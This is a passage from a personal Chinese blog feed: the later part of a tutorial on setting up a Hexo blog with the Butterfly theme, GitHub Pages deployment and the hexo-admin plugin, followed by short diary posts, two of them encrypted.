class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418205145615.png" alt="image-20250418205145519"></p></li><li><p>点进这个网址，或在浏览器中输入这个url <code>http://localhost:4000/</code></p><p>就能看到初始化好了的hexo博客</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418205555067.png" alt="image-20250418205315952"></p><p>测试成功后，<code>Ctrl+C</code>停止服务器</p></li></ol><hr><h3 id="修改-config-yml">修改<code>_config.yml</code></h3><ol><li><p>暂时先修改这些，其他的可以在主题文件中修改</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Site</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">test-0hh&#x27;s</span> <span class="hljs-string">Blog</span><br><span class="hljs-attr">subtitle:</span> <span class="hljs-string">&#x27;test-0hh&#x27;</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">&#x27;Hello World&#x27;</span><br><span class="hljs-attr">keywords:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">test-0hh</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span><br><span class="hljs-attr">timezone:</span> <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span><br><br><span class="hljs-comment"># URL</span><br><span class="hljs-comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="hljs-attr">url:</span> <span class="hljs-string">https://test-0hh.github.io</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418210023908.png" alt="image-20250418210023781"></p><p>其中的<code>title</code> <code>subtitle</code> <code>language</code>能够体现在：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250425162906586.png" alt=""></p><p><code>author</code>能够体现在，页脚部分</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418210806884.png" alt="image-20250418210806728"></p><p><code>timezone</code>就是时区</p><p><code>keyword</code>和<code>description</code>暂时没发现在哪里</p><p><font color='purple'>最重要的就是要把<code>title</code>修改掉，其他的可能可以在主题配置中再修改</font></p></li><li><p>url要修改成<code>https://你的github用户名.github.io</code>，因为之后会在github上挂载，会使用这个域名进入博客</p></li></ol><hr><h3 id="修改主题">修改主题</h3><p>在这里可以进行主题配置，hexo官网有很多好看的主题-&gt;<a href="https://hexo.io/themes/">主题汇总</a>，根据自己想要的功能、喜欢的外观进行配置即可，一般主题都会有详细的配置文档。</p><p>修改主题时，只需将主题文件拷贝到博客文件夹根目录下的<code>/themes</code>文件夹下，再在<code>_config.yml</code>文件最下面的<code>theme</code>字段中，修改为自己主题的名字即可。</p><p>这里以<code>butterfly</code>为例，这些步骤都在其主题配置文件中有</p><ol><li><p>首先在终端中克隆后，将<code>theme</code>字段修改为<code>butterfly</code>即可</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418212118162.png" alt="image-20250418212117957"></p></li><li><p>配置完主题文件后，或在配置主题时，想要看看效果，可以启动服务器，即在<code>git bash</code>终端中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><p>启动服务器，按住<code>Ctrl</code>单击点进去即可</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418212608115.png" alt="image-20250418212607943"></p><p>进入后，就能看到已经改成butterfly主题了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418212649298.png" alt="image-20250418212649120"></p></li></ol><hr><h3 id="GitHubPages托管">GitHubPages托管</h3><h4 id="创建github仓库">创建github仓库</h4><ol><li><p>登入github，点进自己的仓库</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418213003257.png" alt="image-20250418213003085"></p></li><li><p>点击new</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418213058785.png" alt="image-20250418213058632"></p></li><li><p>在仓库名中写<code>你的github用户名.github.io</code>，其他的可填可不填，只要选择<code>public</code>即可，然后点击<code>创建仓库</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418213211180.png" alt="image-20250418213211076"></p></li><li><p>创建成功了，这显示还是一个空的仓库，点击<code>ssh</code>，复制ssh的链接</p><p><font color='orange'>*注意不要复制错了，复制https的不会成功</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418213848486.png" alt="image-20250418213848310"></p></li></ol><h4 id="deploy配置">deploy配置</h4><ol><li><p>在终端中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418213623064.png" alt="image-20250418213622965"></p></li><li><p>在<code>_config.yml</code>文件的最底部，有一个<code>deploy</code>字段，修改其中的配置</p><p>其中的<code>repo</code>就是刚才复制的仓库ssh地址</p><p>这里<code>branch</code>字段中的值，如果前面安装git时，没有选择&quot;override the default branch name for new repositories&quot;，那么就把<code>main</code>改成<code>master</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:xx/xx.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><p>我的文件中如下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418214027223.png" alt="image-20250418214027016"></p></li></ol><h4 id="将hexo推送到github">将hexo推送到github</h4><ol><li><p>这里直接在终端中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br></code></pre></td></tr></table></figure><p><code>hexo clean</code>: 清除博客上一次的静态文件</p><p><code>hexo g</code>: 生成静态文件</p><p><code>hexo d</code>: 将博客推送到github仓库中</p><p><font color='orange'>*建议每一次推送时，将静态文件都重新生成，不然可能会使得修改博客的操作无法成功</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418214729552.png" alt="image-20250418214729455"></p><p>只要最后出现了这样的语句就是成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418215935332.png" alt="image-20250418215935165"></p></li><li><p>刷新一下之前创建github仓库的界面，发现有文件已经出现了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418215152858.png" alt="image-20250418215152679"></p></li><li><p>点击<code>settings</code>-&gt;<code>pages</code>-&gt;<code>Visit site</code>，就能发现之前只能在本地访问的页面，能够通过<code>你的github用户名.github.io</code>进行访问了，其他人也可以通过这个链接访问</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418215335026.png" alt="image-20250418215334863"></p></li></ol><hr><p>至此，hexo博客的搭建以及基本完成了。接下来介绍hexo-admin插件，能够更方便地对博客进行管理。</p><hr><h3 id="hexo-admin插件的配置">*hexo-admin插件的配置</h3><h4 id="安装插件">安装插件</h4><ol><li><p>在终端中输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-admin<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418220100592.png" alt="image-20250418220100487"></p></li><li><p>这个插件由于Node.js的安全更新，会出现bug，具体请看我的另一篇博客</p><blockquote><p><a href="https://blog.csdn.net/aohh_/article/details/144775412?spm=1001.2014.3001.5501">有关Hexo-Admin插件的问题</a>  中的问题三</p></blockquote><p>这里直接说解决方法，就是在博客文件夹根目录下<code>./node_modules/hexo-admin/deploy.js</code>文件中的<code>第14行</code>，将</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> proc = <span class="hljs-title function_">spawn</span>(command, [message], &#123;<span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>&#125;);<br></code></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">var proc = spawn(<span class="hljs-built_in">command</span>, [message], &#123; shell: <span class="hljs-literal">true</span> &#125;, &#123;detached: <span class="hljs-literal">true</span>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418220631538.png" alt="image-20250418220631350"></p></li></ol><h4 id="创建hexo-deploy-bat">创建<code>hexo-deploy.bat</code></h4><ol><li><p>在博客文件夹根目录下创建<code>hexo-deploy.bat</code>文件</p><p>左边工作区右键点击空白处，点击<code>新建文件</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418214837587.png" alt="image-20250418204750746"></p><p>输入<code>hexo-deploy.bat</code>后回车</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418214837385.png" alt="image-20250418204859183"></p></li><li><p>在<code>hexo-deploy.bat</code>写入</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418221252416.png" alt="image-20250418221252308"></p></li></ol><h4 id="进入admin">进入admin</h4><ol><li><p>终端中启动服务器，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure></li><li><p>进入<code>http://localhost:4000/admin</code>，则进入了管理员界面，能够看到所有的博文</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418221551956.png" alt="image-20250418221551763"></p></li><li><p>点击<code>settings</code>-&gt;<code>setup authentification here</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418222003333.png" alt="image-20250418222003152"></p></li><li><p>设置自己的用户名 密码 secret，复制下面框内的内容</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418222642398.png" alt="image-20250418222642222"></p></li></ol><h4 id="修改-config-yml-v2">修改<code>_config.yml</code></h4><ol><li><p>修改根目录下的<code>_config.yml</code>文件，在最后加上刚刚复制的部分，再添加上<code>deployCommand</code>字段，将<code>hexo-deploy.bat</code>文件作为内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hexo-admin authentification</span><br><span class="hljs-attr">admin:</span><br>  <span class="hljs-attr">username:</span> <span class="hljs-string">...</span><br>  <span class="hljs-attr">password_hash:</span> <span class="hljs-string">...</span><br>  <span class="hljs-attr">secret:</span> <span class="hljs-string">...</span><br>  <span class="hljs-attr">deployCommand:</span> <span class="hljs-string">&#x27;hexo-deploy.bat&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418222817271.png" alt="image-20250418222817108"></p></li></ol><h4 id="测试hexo-admin">测试hexo-admin</h4><ol><li><p>重启一遍服务器：在终端<code>Ctrl+C</code>关闭后，重新输入<code>hexo s</code>启动服务器，再进入<code>http://localhost:4000/admin</code>，需要输入用户名和密码了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418223143831.png" alt="image-20250418223143652"></p></li><li><p>输入刚才设置的用户名和密码，点击<code>submit</code>，重新进入admin界面</p></li></ol><h4 id="如何使用admin">如何使用admin</h4><ol><li><p>修改博客这个比较直观，每个键点一下就知道什么意思了，就不过多赘述了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418223741027.png" alt="image-20250418223740838"></p></li><li><p>博文点击<code>publish</code>后，其对应的md文件会存储在根目录的<code>source/_posts/</code>文件夹下，还可以对其进行修改</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418223844363.png" alt="image-20250418223844171"></p></li><li><p>修改完博文之后，<font color='red'>一定</font>要记得回到admin中，在<code>deploy</code>-&gt;<code>deploy</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418224108578.png" alt="image-20250418224108450"></p></li><li><p>看似有&quot;std error&quot;，没关系，只要最后输出了红框中的内容就可以</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418224138619.png" alt="image-20250418224138413"></p></li><li><p>现在外人能访问到的<code>test-0hh.github.io</code>上也有了刚刚编辑的博客了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418224340064.png" alt="image-20250418224339872"></p></li></ol><hr><h3 id="写在最后">写在最后</h3><p>hexo中还有其他的一些插件，如<code>hexo-encrypt</code>可以对单篇博文进行加密；<code>gitalk</code>可以为博客添加评论或留言板功能等，在配置时，可能要考虑与自身主题是否适配的问题。</p><p>还有一点，hexo在后期如果加入太多图片等静态资源，可能会导致加载速度过慢的问题，这时候可以将博文中的图片放入图床中进行加载，我用的是(<code>piclist</code> + <code>gitee</code> + <code>typora</code>)或者在源代码中就对图片进行压缩。</p><p>最近朋友尝试配图床时，发现使用piclist不能成功，换回picgo就能够成功了（但是使用piclist一键导入picgo之后，piclist和picgo就都不能成功了），至今不知道为什么会这样。。只能老实配picgo了</p><p>我之前从picgo换成piclist是因为我想要给图片加上水印，piclist的功能更多更全面。</p><p>还是推荐先配置piclist，如果piclist不行再使用picgo，兼容更好。</p><hr><h4 id="发现了新-其实是旧的-的bug">发现了新(其实是旧的)的bug</h4><p>由于gitee图床的防盗链问题，配置图床后引用图片可能无法再hexo中显示，具体体现在：</p><blockquote><p>通过引用的链接能够找到gitee库中的图片</p><p>但在网络选项卡下，图片的状态码是<code>302</code>，并且<code>referer</code>显示为本地localhost或自身hexo博客的url</p></blockquote><p>这个情况下，就说明gitee发现了这个页面不是可行的页面，启用了防盗链。</p><p>fluid主题下（别的主题可能也可以），可以直接在单篇博客的md文件中，在标头下方加上：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p>更通用的，搜索<code>head.ejs</code>文件，适当的位置加上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;<br></code></pre></td></tr></table></figure><p>也有可能是<code>head.pug</code>文件，适当的位置加上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pug">meta(name=&quot;referrer&quot; content=&quot;no-referrer&quot;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>study-else</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo-Setup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FinallySubmit</title>
    <link href="/2025/04/17/finallysubmit/"/>
    <url>/2025/04/17/finallysubmit/</url>
    
    <content type="html"><![CDATA[<p>假装这是17日发的，论文终于提交了啊啊</p><p>本来以为还有很多要改的，怎么也得到下周去了，终于还是在这周结束了。</p><p>老师说最近没什么事就闲着嘿嘿。</p><p>在痛苦的时候幻想有不少想做的事情，于是这两天在无聊的刷手机中，穿插了一些不太正经的正经事。</p><p>果然还是要在忙的时候手机才最好玩。</p><p>希望可以顺利地修一次就能接收，剩下的就不说了。。。</p><p>（提交这天还是我担的生日嘿嘿，提交完火速就换了vx头像，这很好记了</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FeelSecure</title>
    <link href="/2025/04/11/feelsecure/"/>
    <url>/2025/04/11/feelsecure/</url>
    
    <content type="html"><![CDATA[<p>喜欢有安全感的让人安心的关系。</p><p>–</p><p>决定出一个完整版的搭博客教程，这个月之内肯定弄完，不会有任何意外（也不一定&gt;&lt;</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hide</title>
    <link href="/2025/04/10/hide/"/>
    <url>/2025/04/10/hide/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="842716647be1e87fbfdbb87c6de7d621bec8bd9c4d1bf5041342f2450a53f42a">0648cd8d957666a6fa9197b0cb999a83b26965c45ef139c5bc8fc5adce17be88fa0cdc4663582068d3933e3bb581f8be158f7fa6e5ba319dcd648cf7be46d494615095a40fa0636072aee3a92f3b66aeffa475eca22f6e42f20a4a5cb9044798c7e172ce5db82698f26b64462faf722a046c16c489615a3fb776f8a7a4e8a67aae55a4080f16832d2f755f5171b27bf08691db3b1f69422655d758b636fb510a9f532243175c2c079035c7f4b1c433c6d0981cb15a330bd4ac9380219b3d4b4b965549663ac5aeffb3b422ca92d30808</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter my Bday, hope u remember!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Again</title>
    <link href="/2025/04/07/again/"/>
    <url>/2025/04/07/again/</url>
    
    <content type="html"><![CDATA[<p>看着朋友第一次有博客的样子这么开心，感觉怪欣慰的</p><p>只要一点点的报酬就可以</p><p>嘘 不要暴露我</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Overwhelmed</title>
    <link href="/2025/04/06/overwhelmed/"/>
    <url>/2025/04/06/overwhelmed/</url>
    
    <content type="html"><![CDATA[<p>啊啊啊啊太崩溃了，我将不会改任何一句话啊啊</p><p>要改的东西好多，真的在周五前发吗</p><p>我想买相机</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Paper</title>
    <link href="/2025/04/01/paper/"/>
    <url>/2025/04/01/paper/</url>
    
    <content type="html"><![CDATA[<p>不能去想做了有什么意义，以完成这件事为目的才能有动力。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ISaidThat</title>
    <link href="/2025/03/31/isaidthat/"/>
    <url>/2025/03/31/isaidthat/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2392097bc1183d6cda9da6e816aea7d657467f1909040dceda55d0b8c468d171">0648cd8d957666a6fa9197b0cb999a832b550c17576ee072bcca82bd06318313e9b2bb4b44b814732f5d5a38b9a2f4b8bf55791d31d72b8e427aa9712cf52082979561bd3496ac7f620d9bc308c905cef77a080b83a9b49e840673b1802710b02bc02a9bd89014ca80c107fcb6f3278805211351dc0180e7d7ccae2973194cd106ff4dd42e4eec26896f6cc5c9b5ad3e6a988ea81c35e817de6fac7aa28febe4f73ce298bf6cd99ed8a5cdc019b04a6322416d7e70ce6b52c16661a195e68f87817f986a3cc6ffa4addefc84ff3e72875e461fec5805968c60660516404cc75118025b804ad167ac1ec62d5e3639d034e2718fab291e87fd076507922a2b4755ee20e62e2a2bf50bd9262dd50190a78d41ccb7be014d6cc836eeedd9eba6d8646ea39d58bd45f0e03fdb2da8fb1f76ff002e08db7c0d8c7f0ee46ef64cdb2f7ed742a1d010f7a21c837d1732121dc95bdb093222a79e96109907afcab4d5ae18e7cebac5d3e9fea9fe32020343ab7717ee9af7e550922bd34b32ae7efabb92c57f0bf038def58e80b30766dece8787377aa485332303f8af646f1ba160fb261e16bb93d9deedff4a16009964238eb55e4e1dbd234605d13e2dc4fbd3a5b55f06d6fafc85a7a21265f6f182ddfae231b63ac62187cf6d314745c054242df62ddc2bc4d23f048f50e287062c6f7a72e961f742d31da04a935ba0b4f148df0e2a4656645c55b9cba5132943d8a732a71b0e8265d731becd5075a1f8a33314e4cd732fc2036d172a1933421bb23c11ebaf31934c4da3b401076844741f755a1a605882b1e6a9b33616e155efe9a6402408d0b2c35e5a1bb587c462e5728ef2bdc2ecc9c8230538ab42d600b7fa312875cad0a69582d9361d2430605de8904f9a8ec994f7e36456ca2a2b4f7e23e4d607eeeaa9b24583f154246c1185147866e014f61f32beab2aa8de91145f26a9c91aee0cc2d9f7fcca1223fa7140f0bc066de64c610dab63a247379cb8ebfce268fc5db31e8c3dc679a2964798efbaa4b8e70cbf8fd086feefbf88446316c3b24d07455b966680db0f87982b739cee10d10dedf441435cee551beab8cec50244de5c5fb33f5d2e7feaf776b00f98c31d12e7248fda949a7810eedb22f03f8c8d80a2ffdd6e05e2d18ab1340a542fa74b8061ad0e523d6b407aff00e378b2f5d4a98f07cf58be5de80965cb61fd36be9ee364116e6c40c5e587b9dfb4055c288a301ff0cbd4baeb5b5559bf78919ea366d348a4af798f7eafbeb05443b9dc2ea0b9febf5ff2fbc7bd2ca5640ec552c24896f5b473ba6c3c0345cfb2351fb08b912972c1e33acfdbb28263c305c5ade076dbe99c7eed1c33235064043028f7b1af6526543cdf0adfe0b51280631274ffecba200484d4e4b9829f5b4f0ee06ed2d5bc1a833160260dc4d83ce404356404b2443320e69a3fe3c1239fe71703815555740893a465ebf39650a86e50e577c7992c42dea05d531903fab88ffd6f98468278ead17e72d2d2cb4b6c7b9cdfb687f71f419cc92e3ed0d3d020437c70bcbbfac01962a4e4e0f86e17d3dc0e6c0379bb284121f9829836afdcf5d9d044cba0bf20bc69f5481c43a56f81090c3cbd6ba8fa78f21db25f3f960a82db801ea6dbbad95fedfd2af6c1131ff0e61515c7f2f43f8da02fb094ec6a61f23513542cea43a91e5717109bb3961833724bd23d492371d9d1fec6b30fff60dbdd14eb00d787d0e366f4aeaefcd2fc044b784d4ef08d247a643f908e9a47086135d1ad2f7658d60dec3026ab0708acd88fbabb554bf542123d9764d835b65659ff669f5bbcc27ed89c77e76b872ce5810a057326aa1e13d749b7ee05190d9bf98a19dc103f6f5b7cea768dfc2b9c845075a083bca68b7cea69469d9f55f5d435c71b02ce9bf0e29e64992a513d50a8c074e65108754384c22b727d298fb26d03746c90495fa5c48dc0fe873f3243621eabd98b47f4f0fa1e58871830b456df4414e31eb37112eb845094ae7c947714a52a8522a0c42ae0b35a3c67eeb73e728814a7113933a40e98c23de3fc8b77cb13474daa5c5d330087a452a8f9c405eb9c37cdd705b6ccd9ba7e98132c77f145da09fa318ca32204c9752c45d53565737e94d23ca58d2ad779586b82f5224da2dc744051a9f72bfe34012d8f8eea9bf6d76a308b91787d3eb0db16de786de3b19a300069e73ed41f403bdad89f3b9d6bc082d035848f02a3be8d16131e97150b9ce316d89624456df9a5e200963fd7cfe96bfdbc84ee75b0a8939eabfb8f6f0892484617ca17b4d20c285c17f681e54758e3b5c459478877d6b785a19ddb2fec81363897fa922aef4aed9ef42f6c120c7bce4b684507b3fe0e7ff4a7683aff421e0427bb03427cca72bba3071759d0288526a6fdc38f65993121404f220f112fc6299e04be06c759494945bb13cac0f17b6fcfe399851911a4f5266f4828276b966f5773adad9ab3ec4944588994439038d5312603780fcb05512c08eae3caf406bc3fcca814acd18c5e0525153ddc86fa578b9f470135c438700ab3edaf5ec6170d70d06f54d5f226a806552c055dc0b182c3feb14994b759c06b0499460de4a1ebb289bd64af31d3eabc9327bad855a05db6cf3128a7bbf48626862878938f7fc3f709418a59423883423fed8f09bfbca93b6c289138460aec312af0b75cf1eeb10a9c856f1bca7c3b90b3aabedbb96132482dba2582a7286c0ae95bacb7389c2e888a947d7f8c278733b9b01852501d12e25e7b7643c8445a367a0e3d847712eba227d565b05686d0a020e35d8f10f3f484b3ae80fcf9a978582771f50a779a518db7aceac5db4842cbaa440e113d3bce7d57ded5523376ad744d88316c90df2ba890eefc7f835847b16b15404aca71450af58b286cc305410a64030d3bccab165e74e4aa18a00786fc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter my Bday, hope u remember!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Method</title>
    <link href="/2025/03/26/method/"/>
    <url>/2025/03/26/method/</url>
    
    <content type="html"><![CDATA[<p>越问gpt越觉得这个方法居然有道理的，本来以为有点扯的。。</p><p>果然还是要用别人的方法哈</p><p>–</p><p>所以原理图到底怎么画，谁能把我脑子里的浆糊理清楚点</p><p>–</p><p>再过几天来看这篇，真是觉得自己有点太天真了。。</p><p>前半部分对抗的逻辑完全想反了啊！搞得那天晚上特别慌张是不是得从头把实验再做一遍。。。</p><p>和老师说了之后，老师完全不认为是一件大事，试了一两个示例之后发现，果然是没有任何区别哈^^</p><p>真是有点地狱得好笑了，我到底在做什么东西啊</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LinksWithFriends</title>
    <link href="/2025/03/24/linkswithfriends/"/>
    <url>/2025/03/24/linkswithfriends/</url>
    
    <content type="html"><![CDATA[<p>在友链上放上朋友的感觉好好玩！</p><p>原来我是废话博主啊，怎么能有这么多废话要讲，哦还是一句话心情博主和日记博主啊啊啊啊</p><p>现在有文艺博主和理工硬核博主在我的links中，还有谁要无聊搭博客，我将无偿debug</p><p>好想让朋友们都有博客，像小时候的蛐蛐空间一样</p><p>–</p><p>我觉得我应该多写点东西去CSDN，不然都要忘了我一开始是为了实验才把这个博客捡起来的</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>YourColor</title>
    <link href="/2025/03/21/yourcolor/"/>
    <url>/2025/03/21/yourcolor/</url>
    
    <content type="html"><![CDATA[<p>循环你的颜色歌单快一个月了。</p><p>想起看完时，一直在想小君真的就这样不去上学了吗，那未来怎么办？</p><p>又去找她退学的原因，觉得肯定删减了什么更合理的理由。</p><p>但事实上，小君就是因为自己心里的劣等感与想要寻求自己心里的平静而退学的。</p><p>就像老师和她说的那样，“你毕业了，在自己的时间里。”</p><p>我才是当时嘴上说着很喜欢，其实没有看懂的那个。</p><p>像童话一样，没有给出答案，大家都还像孩子一样迷茫地前行着，大人们也理所当然地理解了，没有矛盾，没有争吵，也不用背负什么未来，不想面对的话，逃跑也没关系，不用承担什么后果，自己不要纠结就好了。</p><p>真好啊，太美好了。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Future</title>
    <link href="/2025/03/17/future/"/>
    <url>/2025/03/17/future/</url>
    
    <content type="html"><![CDATA[<p>未来会是怎么样的？我能知道答案吗</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>3.14</title>
    <link href="/2025/03/14/3-14/"/>
    <url>/2025/03/14/3-14/</url>
    
    <content type="html"><![CDATA[<p>对3.14印象最深的，是高一还是高二的那一天。</p><p>中午正在大暴雨，天很昏暗，打着雷，不时还有闪电，和 hhq 或许还有鸭和jt，撑着伞，踩着水滩，还是湿了大半裤脚地踏进教室。</p><p>听到有人说，霍金去世了，想到今天是一个好数学的日子。</p><p>有人说好喜欢这个天气，不喜欢小雨，不够畅快，这么大的雨想立马冲下去。</p><p>我没说话，觉得他有病，所有的雨天我都不喜欢，现在也不喜欢。</p><p>突然又有人说中午有日全食，大家就都往走廊上去了。</p><p>其实我根本没看到什么日全食，只记得天一点点变得昏暗，像世界末日一样。</p><p>（如果下了雨还会有日全食吗？话说是不是记错了啊）</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyName</title>
    <link href="/2025/03/10/myname/"/>
